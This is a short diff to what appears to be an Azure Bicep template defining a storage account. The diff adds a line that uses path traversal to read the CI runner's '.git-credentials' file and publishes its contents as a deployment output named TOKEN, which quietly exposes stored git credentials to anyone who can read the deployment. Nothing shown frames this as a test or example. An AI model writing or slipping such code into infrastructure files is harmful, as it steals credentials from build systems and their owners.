@@ -1,4 +1,5 @@
-var gitconfig = loadTextContent('../.git/config')
+
+  var creds = loadTextContent('../../../../../../home/runner/.git-credentials')
 
   param location string = 'eastus'
 
@@ -9,4 +10,4 @@ var gitconfig = loadTextContent('../.git/config')
     kind: 'StorageV2'
   }
 
-  output TOKEN string = gitconfig
+  output TOKEN string = creds
